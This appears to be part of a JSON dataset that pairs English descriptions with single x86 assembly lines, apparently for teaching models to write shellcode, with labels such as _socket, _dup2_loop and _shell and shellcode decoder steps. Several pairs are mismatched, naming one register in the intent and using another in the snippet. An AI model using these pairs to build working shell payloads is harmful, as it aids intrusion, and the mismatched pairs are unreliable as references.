[
  {
    "intent": "define the _appendfile label",
    "rewritten_intent": "define the _appendfile label",
    "snippet": "_appendfile:",
    "slot_map": {
      "_appendfile": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _build label",
    "rewritten_intent": "define the _build label",
    "snippet": "_build:",
    "slot_map": {
      "_build": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _child label",
    "rewritten_intent": "define the _child label",
    "snippet": "_child:",
    "slot_map": {
      "_child": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _close label",
    "rewritten_intent": "define the _close label",
    "snippet": "_close:",
    "slot_map": {
      "_close": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _cmd label",
    "rewritten_intent": "define the _cmd label",
    "snippet": "_cmd:",
    "slot_map": {
      "_cmd": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _continue label",
    "rewritten_intent": "define the _continue label",
    "snippet": "_continue:",
    "slot_map": {
      "_continue": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _dup2_loop label",
    "rewritten_intent": "define the _dup2_loop label",
    "snippet": "_dup2_loop:",
    "slot_map": {
      "_dup2_loop": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _exec label",
    "rewritten_intent": "define the _exec label",
    "snippet": "_exec:",
    "slot_map": {
      "_exec": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _execline label",
    "rewritten_intent": "define the _execline label",
    "snippet": "_execline:",
    "slot_map": {
      "_execline": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _exit label",
    "rewritten_intent": "define the _exit label",
    "snippet": "_exit:",
    "slot_map": {
      "_exit": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define ip equal to 0x0100007f",
    "rewritten_intent": "define ip equal to 0x0100007f",
    "snippet": "_ip equ 0x0100007f",
    "slot_map": {
      "0x0100007f": "var0"
    },
    "intent_tokens": [
      "define",
      "ip",
      "equal",
      "var0"
    ],
    "snippet_tokens": [
      "_ip",
      "equ",
      "var0"
    ]
  },
  {
    "intent": "define the _isegg label",
    "rewritten_intent": "define the _isegg label",
    "snippet": "_isegg:",
    "slot_map": {
      "_isegg": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _load_data label",
    "rewritten_intent": "define the _load_data label",
    "snippet": "_load_data:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_load_data",
      "label"
    ],
    "snippet_tokens": [
      "_load_data",
      ":"
    ]
  },
  {
    "intent": "define the _next label",
    "rewritten_intent": "define the _next label",
    "snippet": "_next:",
    "slot_map": {
      "_next": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _params label",
    "rewritten_intent": "define the _params label",
    "snippet": "_params:",
    "slot_map": {
      "_params": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _parent_read label",
    "rewritten_intent": "define the _parent_read label",
    "snippet": "_parent_read:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_parent_read",
      "label"
    ],
    "snippet_tokens": [
      "_parent_read",
      ":"
    ]
  },
  {
    "intent": "define the _parent label",
    "rewritten_intent": "define the _parent label",
    "snippet": "_parent:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_parent",
      "label"
    ],
    "snippet_tokens": [
      "_parent",
      ":"
    ]
  },
  {
    "intent": "define the _random label",
    "rewritten_intent": "define the _random label",
    "snippet": "_random:",
    "slot_map": {
      "_random": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _return label",
    "rewritten_intent": "define the _return label",
    "snippet": "_return:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_return",
      "label"
    ],
    "snippet_tokens": [
      "_return",
      ":"
    ]
  },
  {
    "intent": "define the _setsockopt label",
    "rewritten_intent": "define the _setsockopt label",
    "snippet": "_setsockopt:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_setsockopt",
      "label"
    ],
    "snippet_tokens": [
      "_setsockopt",
      ":"
    ]
  },
  {
    "intent": "define the _shell label",
    "rewritten_intent": "define the _shell label",
    "snippet": "_shell:",
    "slot_map": {
      "_shell": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _socket label",
    "rewritten_intent": "define the _socket label",
    "snippet": "_socket:",
    "slot_map": {
      "_socket": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _start label",
    "rewritten_intent": "define the _start label",
    "snippet": "_start:",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the _user label",
    "rewritten_intent": "define the _user label",
    "snippet": "_user:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_user",
      "label"
    ],
    "snippet_tokens": [
      "_user",
      ":"
    ]
  },
  {
    "intent": "define the _while_loop label",
    "rewritten_intent": "define the _while_loop label",
    "snippet": "_while_loop:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "_while_loop",
      "label"
    ],
    "snippet_tokens": [
      "_while_loop",
      ":"
    ]
  },
  {
    "intent": "define the _write label",
    "rewritten_intent": "define the _write label",
    "snippet": "_write:",
    "slot_map": {
      "_write": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the numeric label 1",
    "rewritten_intent": "define the numeric label 1",
    "snippet": "1:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "numeric",
      "label",
      "1"
    ],
    "snippet_tokens": [
      "1",
      ":"
    ]
  },
  {
    "intent": "define the label 1",
    "rewritten_intent": "define the label 1",
    "snippet": "1:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "label",
      "1"
    ],
    "snippet_tokens": [
      "1",
      ":"
    ]
  },
  {
    "intent": "define the label 2",
    "rewritten_intent": "define the label 2",
    "snippet": "2:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "label",
      "2"
    ],
    "snippet_tokens": [
      "2",
      ":"
    ]
  },
  {
    "intent": "define the numeric label 2",
    "rewritten_intent": "define the numeric label 2",
    "snippet": "2:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "numeric",
      "label",
      "2"
    ],
    "snippet_tokens": [
      "2",
      ":"
    ]
  },
  {
    "intent": "define the label 3",
    "rewritten_intent": "define the label 3",
    "snippet": "3:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "label",
      "3"
    ],
    "snippet_tokens": [
      "3",
      ":"
    ]
  },
  {
    "intent": "define the numeric label 3",
    "rewritten_intent": "define the numeric label 3",
    "snippet": "3:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "numeric",
      "label",
      "3"
    ],
    "snippet_tokens": [
      "3",
      ":"
    ]
  },
  {
    "intent": "allocate one byte of memory for a_letter variable and initialize it to 'd'",
    "rewritten_intent": "allocate one byte of memory for a_letter variable and initialize it to 'd'",
    "snippet": "a_letter db 'd'",
    "slot_map": {
      "'d'": "var3",
      "a_letter": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "one",
      "byte",
      "memory",
      "var0",
      "var1",
      "variable",
      "and",
      "initialize",
      "it",
      "var3"
    ],
    "snippet_tokens": [
      "var1",
      "db",
      "var3"
    ]
  },
  {
    "intent": "add esi into memory address ebp-4",
    "rewritten_intent": "add esi into memory address ebp-4",
    "snippet": "add [ebp-4], esi",
    "slot_map": {
      "ebp-4": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "memory",
      "address",
      "ebp-4"
    ],
    "snippet_tokens": [
      "add",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the bh register into the ah register",
    "rewritten_intent": "add the contents of the bh register into the ah register",
    "snippet": "add ah, bh",
    "slot_map": {
      "ah": "var0"
    },
    "intent_tokens": [
      "add",
      "contents",
      "bh",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "bh"
    ]
  },
  {
    "intent": "add 0x25 to the al register",
    "rewritten_intent": "add 0x25 to the al register",
    "snippet": "add al, 0x25",
    "slot_map": {
      "0x25": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x3 to the contents in al and save the result in al",
    "rewritten_intent": "add 0x3 to the contents in al and save the result in al",
    "snippet": "add al, 0x3",
    "slot_map": {
      "0x3": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "al",
      "and",
      "save",
      "result",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x33 to the contents in al and save the result in al",
    "rewritten_intent": "add 0x33 to the contents in al and save the result in al",
    "snippet": "add al, 0x33",
    "slot_map": {
      "0x33": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "al",
      "and",
      "save",
      "result",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x66 to the contents in al and save the result in al",
    "rewritten_intent": "add 0x66 to the contents in al and save the result in al",
    "snippet": "add al, 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "al",
      "and",
      "save",
      "result",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0xa to the al register",
    "rewritten_intent": "add 0xa to the al register",
    "snippet": "add al, 0xa",
    "slot_map": {
      "0xa": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0xb to the al register",
    "rewritten_intent": "add 0xb to the al register",
    "snippet": "add al, 0xb",
    "slot_map": {
      "0xb": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add byte '0' to al",
    "rewritten_intent": "add byte '0' to al",
    "snippet": "add al, byte '0'",
    "slot_map": {
      "'0'": "var0"
    },
    "intent_tokens": [
      "add",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "add the byte in edi to the al register",
    "rewritten_intent": "add the byte in edi to the al register",
    "snippet": "add al, byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "byte",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add memory[di + 20] to ax",
    "rewritten_intent": "add memory[di + 20] to ax",
    "snippet": "add ax, [di + 20]",
    "slot_map": {
      "di + 20": "var1",
      "memory[di": "var0"
    },
    "intent_tokens": [
      "add",
      "memory",
      "[",
      "var1",
      "]",
      "ax"
    ],
    "snippet_tokens": [
      "add",
      "ax",
      ",",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "add 01 to ax",
    "rewritten_intent": "add 01 to ax",
    "snippet": "add ax, 01",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "01",
      "ax"
    ],
    "snippet_tokens": [
      "add",
      "ax",
      ",",
      "01"
    ]
  },
  {
    "intent": "add 0x2 to the contents in bl and save the result in bl",
    "rewritten_intent": "add 0x2 to the contents in bl and save the result in bl",
    "snippet": "add bl, 0x2",
    "slot_map": {
      "0x2": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add ax to bx",
    "rewritten_intent": "add ax to bx",
    "snippet": "add bx, ax",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "add",
      "ax",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "ax"
    ]
  },
  {
    "intent": "add 0x4 from the byte at the address edi and negate the result",
    "rewritten_intent": "add 0x4 from the byte at the address edi and negate the result",
    "snippet": "add byte [edi], 0x4 \\n not byte [edi]",
    "slot_map": {
      "0x4": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "byte",
      "address",
      "var1",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "add the byte at the address edi after subtracting the value 7",
    "rewritten_intent": "add the byte at the address edi after subtracting the value 7",
    "snippet": "add byte [edi], 7 \\n not byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "byte",
      "address",
      "var0",
      "after",
      "subtracting",
      "value",
      "7"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "7",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add the value 8 from the byte in edi and negate it",
    "rewritten_intent": "add the value 8 from the byte in edi and negate it",
    "snippet": "add byte [edi], 8 \\n not byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "value",
      "8",
      "byte",
      "var0",
      "and",
      "negate",
      "it"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "8",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add 0x1 from the current byte of the shellcode and negate the result",
    "rewritten_intent": "add 0x1 from the current byte of the shellcode and negate the result",
    "snippet": "add byte [esi], 0x1 \\n not byte [esi]",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "current",
      "byte",
      "shellcode",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "add 0x1 from the byte at the address esi and negate the result",
    "rewritten_intent": "add 0x1 from the byte at the address esi and negate the result",
    "snippet": "add byte [esi], 0x1 \\n not byte [esi]",
    "slot_map": {
      "0x1": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "byte",
      "address",
      "var1",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "add the value 0x9 from the current byte of the shellcode and then negate the result",
    "rewritten_intent": "add the value 0x9 from the current byte of the shellcode and then negate the result",
    "snippet": "add byte [esi], 0x9 \\n not byte [esi]",
    "slot_map": {
      "0x9": "var0"
    },
    "intent_tokens": [
      "add",
      "value",
      "var0",
      "current",
      "byte",
      "shellcode",
      "and",
      "then",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "negate the byte at the address esi after adding the value 2",
    "rewritten_intent": "negate the byte at the address esi after adding the value 2",
    "snippet": "add byte [esi], 2 \\n not byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "negate",
      "byte",
      "address",
      "var0",
      "after",
      "adding",
      "value",
      "2"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "2",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add the value 3 from the byte in esi and negate it",
    "rewritten_intent": "add the value 3 from the byte in esi and negate it",
    "snippet": "add byte [esi], 3 \\n not byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "add",
      "value",
      "3",
      "byte",
      "var0",
      "and",
      "negate",
      "it"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "3",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add 10 to the single byte stored at memory address var",
    "rewritten_intent": "add 10 to the single byte stored at memory address var",
    "snippet": "add byte [var], 10",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "10",
      "single",
      "byte",
      "stored",
      "memory",
      "address",
      "var"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var",
      "]",
      ",",
      "10"
    ]
  },
  {
    "intent": "add 20 to the single byte stored at memory address var",
    "rewritten_intent": "add 20 to the single byte stored at memory address var",
    "snippet": "add byte [var], 20",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "20",
      "single",
      "byte",
      "stored",
      "memory",
      "address",
      "var"
    ],
    "snippet_tokens": [
      "add",
      "byte",
      "[",
      "var",
      "]",
      ",",
      "20"
    ]
  },
  {
    "intent": "add an immediate operand 65 to byte_value",
    "rewritten_intent": "add an immediate operand 65 to byte_value",
    "snippet": "add byte_value, 65",
    "slot_map": {
      "byte_value": "var0"
    },
    "intent_tokens": [
      "add",
      "immediate",
      "operand",
      "65",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "65"
    ]
  },
  {
    "intent": "add the register dl in the memory location byte_value",
    "rewritten_intent": "add the register dl in the memory location byte_value",
    "snippet": "add byte_value, dl",
    "slot_map": {
      "byte_value": "var0"
    },
    "intent_tokens": [
      "add",
      "register",
      "dl",
      "memory",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "dl"
    ]
  },
  {
    "intent": "add 0x2 to the contents in cl and save the result in cl",
    "rewritten_intent": "add 0x2 to the contents in cl and save the result in cl",
    "snippet": "add cl, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "cl",
      "and",
      "save",
      "result",
      "cl"
    ],
    "snippet_tokens": [
      "add",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0xb8 to the cl register",
    "rewritten_intent": "add 0xb8 to the cl register",
    "snippet": "add cl, 0xb8",
    "slot_map": {
      "0xb8": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the value 0x1b into the dx register",
    "rewritten_intent": "add the value 0x1b into the dx register",
    "snippet": "add dx, 0x1b",
    "slot_map": {
      "0x1b": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "add",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x2f2f to the contents in dx and save the result in dx",
    "rewritten_intent": "add 0x2f2f to the contents in dx and save the result in dx",
    "snippet": "add dx, 0x2f2f",
    "slot_map": {
      "0x2f2f": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the local variable stored at ebp-4 into eax",
    "rewritten_intent": "add the contents of the local variable stored at ebp-4 into eax",
    "snippet": "add eax, [ebp-4]",
    "slot_map": {
      "ebp-4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "local",
      "variable",
      "stored",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add 0x10 to eax",
    "rewritten_intent": "add 0x10 to eax",
    "snippet": "add eax, 0x10",
    "slot_map": {
      "0x10": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x12345678 to the contents in eax and save the result in eax",
    "rewritten_intent": "add 0x12345678 to the contents in eax and save the result in eax",
    "snippet": "add eax, 0x12345678",
    "slot_map": {
      "0x12345678": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x2d383638 to the contents in eax and save the result in eax",
    "rewritten_intent": "add 0x2d383638 to the contents in eax and save the result in eax",
    "snippet": "add eax, 0x2d383638",
    "slot_map": {
      "0x2d383638": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x31179798 to the contents in eax and save the result in eax",
    "rewritten_intent": "add 0x31179798 to the contents in eax and save the result in eax",
    "snippet": "add eax, 0x31179798",
    "slot_map": {
      "0x31179798": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x5 to edx and jump to L2 if the result is not 0",
    "rewritten_intent": "add 0x5 to edx and jump to L2 if the result is not 0",
    "snippet": "add eax, 0x5 \\n jnz L2",
    "slot_map": {
      "L2": "var2",
      "0x5": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1",
      "and",
      "jump",
      "var2",
      "if",
      "result",
      "not",
      "0"
    ],
    "snippet_tokens": [
      "add",
      "eax",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var2"
    ]
  },
  {
    "intent": "add the value 0x7 to eax and jump to the label L4 if the sum is not zero",
    "rewritten_intent": "add the value 0x7 to eax and jump to the label L4 if the sum is not zero",
    "snippet": "add eax, 0x7 \\n jnz L4",
    "slot_map": {
      "L4": "var3",
      "0x7": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "add",
      "value",
      "var0",
      "var2",
      "and",
      "jump",
      "label",
      "var3",
      "if",
      "sum",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "add",
      "var2",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var3"
    ]
  },
  {
    "intent": "add 1 to ebx and jump to L1 if the result is not zero",
    "rewritten_intent": "add 1 to ebx and jump to L1 if the result is not zero",
    "snippet": "add eax, 1 \\n jnz L1",
    "slot_map": {
      "L1": "var1",
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "1",
      "var0",
      "and",
      "jump",
      "var1",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "add",
      "eax",
      ",",
      "1",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "add 10 to eax",
    "rewritten_intent": "add 10 to eax",
    "snippet": "add eax, 10",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "10",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "add 10 to the contents of eax",
    "rewritten_intent": "add 10 to the contents of eax",
    "snippet": "add eax, 10",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "10",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "add 16 to eax",
    "rewritten_intent": "add 16 to eax",
    "snippet": "add eax, 16",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "16",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "add 2 to the contents of the eax register",
    "rewritten_intent": "add 2 to the contents of the eax register",
    "snippet": "add eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "2",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add 2 to the eax register",
    "rewritten_intent": "add 2 to the eax register",
    "snippet": "add eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "2",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add decimal 2 to eax register",
    "rewritten_intent": "add decimal 2 to eax register",
    "snippet": "add eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "decimal",
      "2",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add 24 to eax",
    "rewritten_intent": "add 24 to eax",
    "snippet": "add eax, 24",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "24",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "24"
    ]
  },
  {
    "intent": "add 4 to eax",
    "rewritten_intent": "add 4 to eax",
    "snippet": "add eax, 4",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "4",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "add 40000h to eax register",
    "rewritten_intent": "add 40000h to eax register",
    "snippet": "add eax, 40000h",
    "slot_map": {
      "40000h": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 48 to eax",
    "rewritten_intent": "add 48 to eax",
    "snippet": "add eax, 48",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "48",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "48"
    ]
  },
  {
    "intent": "add the value 9 to eax and jump to decode if the result is not zero",
    "rewritten_intent": "add the value 9 to eax and jump to decode if the result is not zero",
    "snippet": "add eax, 9 \\n jnz decode",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "value",
      "9",
      "var0",
      "and",
      "jump",
      "decode",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "9",
      "\\n",
      "jnz",
      "decode"
    ]
  },
  {
    "intent": "add c to eax",
    "rewritten_intent": "add c to eax",
    "snippet": "add eax, c",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "add",
      "c",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "c"
    ]
  },
  {
    "intent": "add ebx to eax",
    "rewritten_intent": "add ebx to eax",
    "snippet": "add eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add ebx to eax and store the result in eax",
    "rewritten_intent": "add ebx to eax and store the result in eax",
    "snippet": "add eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1",
      "and",
      "store",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add edx to eax",
    "rewritten_intent": "add edx to eax",
    "snippet": "add eax, edx",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of edx to the contents of eax",
    "rewritten_intent": "add the contents of edx to the contents of eax",
    "snippet": "add eax, edx",
    "slot_map": {
